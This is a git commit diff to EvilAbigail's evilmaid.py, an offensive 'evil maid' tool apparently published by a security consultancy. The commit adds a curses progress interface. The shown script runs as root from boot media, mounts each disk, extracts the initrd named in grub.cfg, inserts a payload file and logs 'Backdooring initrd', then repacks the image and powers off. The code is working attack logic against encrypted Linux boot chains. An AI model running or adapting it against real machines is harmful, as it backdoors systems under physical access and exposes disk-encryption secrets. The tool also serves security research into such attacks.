25987e2b1488f8d3b60ddcb3fae5bba1fb594055
Rory McNamara <rmcnamara@gdssecurity.com>
2015-11-23 09:03:44 +0000

    Implement cursesui

--- evilmaid.py
+++ evilmaid.py
@@ -4,12 +4,11 @@ import glob
 import re
 import shutil
 import subprocess
+import curses
 
 if os.getuid():
     sys.exit("Please run as root")
 
-error = lambda x:"\033[0;31m[-] "+x+"\033[0;0m"
-info = lambda x:"\033[3;31m[+] "+x+"\033[0;0m"
 system = lambda x:subprocess.call(x, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 DEBIANPRELOADCOMMAND = """
@@ -94,12 +93,194 @@ config = {
                 "INITRDFILENAME" : "hda1"
             }
         }
-print info("Loading drivers...")
+
+banner = """
+ _____       _ _    _    _     _             _ _ 
+| ____|_   _(_) |  / \  | |__ (_) __ _  __ _(_) |
+|  _| \ \ / / | | / _ \ | '_ \| |/ _` |/ _` | | |
+| |___ \ V /| | |/ ___ \| |_) | | (_| | (_| | | |
+|_____| \_/ |_|_/_/   \_\_.__/|_|\__, |\__,_|_|_|
+                                 |___/           
+"""
+copyrightlhs = "Copyright Gotham Digital Science"
+copyrightrhs = "2015"
+url = "https://github.com/GDSSecurity/EvilAbigail"
+
+
+class UI:
+    """
+    NCurses based UI for the EvilAbigail iso
+    """
+    def __init__(self):
+        """
+        Setup the main screen, progress bars and logging box
+        """
+        self.screen = curses.initscr()
+        curses.curs_set(0)
+
+        curses.start_color()
+        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
+        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
+        curses.init_pair(3, curses.COLOR_MAGENTA, curses.COLOR_BLACK)
+        curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
+        curses.init_pair(5, curses.COLOR_BLUE, curses.COLOR_BLACK)
+        curses.init_pair(6, curses.COLOR_YELLOW, curses.COLOR_BLACK)
+
+        self.height, self.width = self.screen.getmaxyx()
+        self.screen.border()
+
+        self.preptotal()
+        self.prepcurrent()
+        self.preplog()
+        self.banner()
+        self.sig()
+
+        self.drives = len(glob.glob("/dev/sd?1"))
+        self.donedrives = 0
+        self.prevprogress = 0
+        self.loglines = []
+        self.idx = 1
+
+    def banner(self):
+        """
+        Print the above banner and copyight notice
+        """
+        bannerlines = banner.split('\n')
+        for idx, line in enumerate(bannerlines):
+            self.screen.addstr(2+idx, 1, line.center(self.width-2), curses.color_pair(3))
+        start = bannerlines[2].center(self.width-2).index('|')+1
+        self.screen.addstr(1+idx, start, copyrightlhs, curses.color_pair(1))
+        self.screen.addstr(1+idx, start+len(copyrightlhs)+7, copyrightrhs, curses.color_pair(1))
+        self.screen.addstr(2+idx, start, url.rjust(len(bannerlines[2])), curses.color_pair(4))
+
+    def sig(self):
+        """
+        Print author signature
+        """
+        self.sig = self.screen.subwin((self.height/2)-6, (self.width-2)/2, (self.height/2)+6, ((self.width-2)/2)+1)
+        self.sig.border()
+        self.sig.addstr(1, 1, "Evil Abigail".center(((self.width-2)/2)-2), curses.color_pair(6))
+        self.sig.addstr(2, 1, "Rory McNamara".center(((self.width-2)/2)-2), curses.color_pair(6))
+        self.sig.addstr(3, 1, "rmcnamara@gdssecurity.com".center(((self.width-2)/2)-2), curses.color_pair(6))
+
+    def preptotal(self):
+        """
+        Draw the total progress bar
+        """
+        self.totalbar = self.screen.subwin(3, (self.width-2)/2, (self.height/2), ((self.width-2)/2)+1)
+        self.totalbar.erase()
+        self.totalbar.border()
+        self.screen.addstr((self.height/2), ((self.width-2)/2)+4, "Total Progress")
+
+    def prepcurrent(self):
+        """
+        Draw the current progress bar
+        """
+        self.currentbar = self.screen.subwin(3, (self.width-2)/2, (self.height/2)+3, ((self.width-2)/2)+1)
+        self.currentbar.erase()
+        self.currentbar.border()
+        self.screen.addstr((self.height/2)+3, ((self.width-2)/2)+4, "Current Drive Progress")
+
+    def preplog(self):
+        """
+        Draw the logging window
+        """
+        self.log = self.screen.subwin((self.height/2), (self.width-2)/2, self.height/2, 1)
+        self.log.erase()
+        self.log.border()
+        self.screen.addstr((self.height/2), 4, "Log")
+
+    def logger(self, line, status):
+        """
+        Log a line to the logging window. Autoscrolls
+        A progress of 1.0 will fill the current bar accordingly (useful for 'continue')
+        Auto splits and indents long lines
+        """
+        statuses = {
+            "ERROR": curses.color_pair(1),
+            "INFO": curses.color_pair(2)
+        }
+        if status == "ERROR":
+            progress = 1.0
+        else:
+            progress = self.idx/self.items
+        self.idx += 1
+        first = True
+        while line:
+            if first:
+                first = False
+                self.loglines.append((line[:37], status))
+                line = line[37:]
+            else:
+                self.loglines.append(('  '+line[:35], status))
+                line = line[35:]
+        self.preplog()
+        for idx, line in enumerate(self.loglines[-((self.height/2)-3):]):
+            self.log.addstr(idx+1, 1, line[0], statuses[line[1]])
+        if progress:
+            self.plot(progress)
+        self.refresh()
+
+    def nextdrive(self, items):
+        """
+        Signifies the start of the next drive for the current progress bar
+        Items is how many logging evens we expect to see on the main path
+        """
+        self.idx = 1
+        self.items = float(items)
+
+    def incritems(self, items):
+        """
+        Allows adding to how many steps we expect to see
+        For branch based differences
+        """
+        self.items += items
+
+    def plot(self, progress):
+        """
+        Actually fill the progress bars accordingly
+        """
+        if progress < self.prevprogress:
+            self.donedrives += 1
+        self.prevprogress = progress
+
+        progress = progress + self.donedrives
+        totalbar = int((progress/self.drives)*((self.width-2)/2))
+        currentbar = int(progress*((self.width-2)/2)) % (self.width/2)
+
+        self.preptotal()
+        self.prepcurrent()
+
+        self.totalbar.addstr(1, 1, "-"*(totalbar-2), curses.color_pair(2))
+        self.currentbar.addstr(1, 1, "-"*(currentbar-2), curses.color_pair(2))
+
+        self.refresh()
+
+    def refresh(self):
+        """
+        Refresh the screen in order
+        """
+        self.totalbar.refresh()
+        self.currentbar.refresh()
+        self.log.refresh()
+        self.screen.refresh()
+
+    def destroy(self):
+        """
+        Clear screen and exit
+        """
+        self.screen.erase()
+        self.refresh()
+        curses.endwin()
+
+ui = UI()
+ui.loglines.append(("Loading Drivers...", "INFO")) # bypass counting
 for driver in glob.glob('/usr/local/lib/modules/3.16.6-tinycore/kernel/fs/*/*.ko.gz'):
     system("insmod {} 2>&1 >/dev/null".format(driver))
 
 for disk in glob.glob("/dev/sd?1"):
-    print info("Trying {}".format(disk))
+    ui.nextdrive(6)
+    ui.logger("Trying {}".format(disk), "INFO")
     system("mount {} /mnt".format(disk))
 
     grubcfgpath = False
@@ -108,7 +289,7 @@ for disk in glob.glob("/dev/sd?1"):
             if file == "grub.cfg":
                 grubcfgpath = os.path.join(root,file)
     if not grubcfgpath or not os.path.isfile(grubcfgpath):
-        print error("{} does not contain grub.cfg".format(disk))
+        ui.logger(" {} does not contain grub.cfg".format(disk), "ERROR")
         system("umount /mnt 2>/dev/null")
         continue
 
@@ -116,14 +297,14 @@ for disk in glob.glob("/dev/sd?1"):
         data = grubcfg.read()
         initrdidx = re.findall('default="([^"]*)"', data)[1]
         if not initrdidx.isdigit():
-            print error("Find default failed. Using 0")
+            ui.incritems(1)
+            ui.logger(" Find default failed. Using 0", "ERROR")
             initrdidx = 0
         else:
             initrdidx = int(initrdidx)
         initrd = re.findall("initrd\d*\s+([^\s]+)", data)[initrdidx]
-    print info("initrd[{}] = {}".format(initrdidx, initrd))
 
-    print info("Extracting initrd...")
+    ui.logger(" Extracting initrd...", "INFO")
     with open("/mnt{}".format(initrd), "r") as fh:
         compressed = (fh.read(2) == "\x1f\x8b")
     system("{} /mnt{} 2>/dev/null| cpio -i 2>&1 >/dev/null".format("gunzip -c" if compressed else "cat", initrd))
@@ -135,14 +316,15 @@ for disk in glob.glob("/dev/sd?1"):
             break
 
     if not detectedOS:
-        print error("OS Detection Failed, Bailing")
+        print error(" OS Detection Failed, Bailing")
         os.system('sh')
         system("umount /mnt 2>/dev/null")
 
     dracut = (detectedOS == "DRACUT")
     if dracut:
+        ui.incritems(2)
         # unpack
-        print info("dracut found, extracting real initrd...")
+        ui.logger(" dracut found, extracting real initrd", "INFO")
         system("rm -rf *")
 
         fh = open("/mnt{}".format(initrd), "r")
@@ -152,17 +334,17 @@ for disk in glob.glob("/dev/sd?1"):
             idx += 1
         system("dd if=/mnt{} bs={} skip=1 | gunzip -c | cpio -i 2>&1 >/dev/null".format(initrd, idx))
 
-        print info("Redetecting OS...")
+        ui.logger(" Redetecting OS...", "INFO")
         detectedOS = ""
         for OS in config:
             if not system(config[OS]["IDENTIFIER"]):
                 detectedOS = OS
                 break
 
-    print info("OS: {}".format(detectedOS))
-    print info("Backdooring initrd...")
+    ui.logger(" OS: {}".format(detectedOS), "INFO")
+    ui.logger(" Backdooring initrd...", "INFO")
     if os.path.isfile(config[detectedOS]["INITRDFILENAME"]):
-        print error("Already backdoored")
+        ui.logger("Already backdoored", "ERROR")
         continue
 
     shutil.copy('/hda1', config[detectedOS]["INITRDFILENAME"])
@@ -176,12 +358,13 @@ for disk in glob.glob("/dev/sd?1"):
             data = re.sub(pre, post, data)
         with open(fname, "w") as fh:
             fh.write(data)
-    os.system('sh')
-    print info("Packing initrd...")
+    ui.logger(" Packing initrd...", "INFO")
     if dracut:
         system("find . | cpio -o -H newc | gzip | dd bs={} seek=1 of=/mnt{}".format(idx, initrd))
     else:
         system("find . | cpio -o -H newc | gzip > /mnt{}".format(initrd))
 
     system("umount /mnt 2>&1 >/dev/null")
+    ui.logger(" Done {}".format(disk), "INFO")
+ui.destroy()
 system("poweroff")
